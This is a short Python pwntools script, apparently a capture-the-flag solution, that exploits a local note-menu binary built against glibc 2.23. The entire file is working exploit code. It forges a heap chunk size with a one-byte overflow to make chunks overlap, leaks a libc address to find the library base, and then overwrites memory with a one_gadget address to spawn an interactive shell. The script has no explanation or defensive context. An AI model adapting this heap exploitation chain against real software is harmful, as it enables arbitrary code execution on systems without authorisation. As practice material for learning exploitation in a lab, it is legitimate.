from pwn import *
p = process("./pwn_collection")
e = ELF("./pwn_collection")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
p.sendlineafter(">", '1')
p.sendlineafter(">", '1')
p.sendlineafter(">", '1')
##context.log_level = 'debug'
p.sendlineafter(">", '2')
p.sendlineafter("index\n", '0')
p.sendlineafter(">", '1')


def add(len, cont):
    p.sendlineafter("chioce>", '1')
    p.sendlineafter("length\n", str(len))
    p.sendlineafter("note\n", cont)


def check(idx):
    p.sendlineafter("chioce>", '2')
    p.sendlineafter("idx\n", str(idx))


def delete(idx):
    p.sendlineafter("chioce>", '3')
    p.sendlineafter("idx\n", str(idx))


#context.log_level = 'debug'

add(0x18, '0')
add(0x58, '1')
add(0x28, '2')
add(0x18, '3')

delete(0)
add(0x18, '0' * 0x18 + '\x91')
delete(1)
add(0x48, '1' * 7)

check(1)
p.recvuntil('\n')
libc_base = u64(p.recv(6) + '\x00\x00') - 216 - 0X3C4B20
print("libc base: " + hex(libc_base))
onr_gadget = libc_base + 0x45216
p.sendlineafter("chioce>", '4')
p.sendlineafter(">", '2')
p.sendlineafter("index\n", '0')
payload = 'a' * 0x28 + p64(0x0602160) * 2 + p64(onr_gadget)
p.sendlineafter(">", payload)
p.interactive()
